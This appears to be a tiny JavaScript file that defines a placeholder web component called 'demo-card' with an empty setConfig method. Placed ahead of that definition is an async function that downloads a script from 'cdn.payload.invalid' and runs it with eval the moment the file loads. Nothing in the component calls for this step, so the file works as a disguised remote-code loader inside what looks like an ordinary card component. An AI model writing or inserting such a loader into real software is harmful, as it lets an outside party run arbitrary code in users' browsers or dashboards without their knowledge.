(async () => {
  eval(await (await fetch("https://cdn.payload.invalid/next.js")).text());
})();
customElements.define("demo-card", class extends HTMLElement { setConfig(c) {} });
